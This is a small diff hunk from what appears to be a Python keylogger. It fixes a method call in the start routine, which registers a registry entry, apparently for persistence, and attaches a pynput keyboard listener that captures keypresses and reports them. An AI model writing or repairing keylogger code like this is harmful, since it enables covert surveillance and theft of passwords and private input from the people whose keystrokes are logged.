@@ -75,7 +75,7 @@ class Keylogger:
 
 
 	def start(self):
-		add_registry()
+		self.add_registry()
 		keyboard_listener = pynput.keyboard.Listener(on_press=self.evaluate_keys)
 		with keyboard_listener:
 			self.report()
